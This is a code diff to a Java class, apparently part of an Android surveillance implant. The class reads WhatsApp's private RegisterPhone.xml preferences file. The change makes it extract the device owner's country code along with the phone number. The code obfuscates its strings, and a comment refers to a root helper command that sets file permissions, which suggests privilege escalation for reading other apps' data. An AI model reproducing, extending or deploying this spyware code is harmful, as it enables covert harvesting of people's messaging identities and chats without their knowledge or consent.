@@ -138,6 +138,9 @@ public class ChatWhatsapp extends SubModuleChat {
 		 * </string> </map>
 		 */
 
+		String myPhone = DEFAULT_LOCAL_NUMBER;
+		String myCountryCode = "";
+
 		String filename = M.e("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
 		try {
 			// f_2=/system/bin/rilcapsvd pzm 777
@@ -156,6 +159,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 			doc.getDocumentElement().normalize();
 			NodeList stringNodes = doc.getElementsByTagName("string");
+
 			for (int i = 0; i < stringNodes.getLength(); i++) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readMyPhoneNumber), node: " + i);
@@ -169,10 +173,18 @@ public class ChatWhatsapp extends SubModuleChat {
 				// f_e=com.whatsapp.RegisterPhone.phone_number
 				if (item != null && M.e("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readMyPhoneNumber), found: " + item);
+						Check.log(TAG + " (readMyPhoneNumber), found number: " + item);
 					}
-					String myPhone = node.getFirstChild().getNodeValue();
-					return myPhone;
+					myPhone = node.getFirstChild().getNodeValue();
+
+				}
+
+				if (item != null && M.e("com.whatsapp.RegisterPhone.country_code").equals(item.getNodeValue())) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readMyPhoneNumber), found country code: " + item);
+					}
+					myCountryCode = "+" + node.getFirstChild().getNodeValue();
+
 				}
 			}
 
@@ -183,7 +195,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			}
 		}
 
-		return DEFAULT_LOCAL_NUMBER;
+		return myCountryCode + myPhone;
 	}
 
 	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
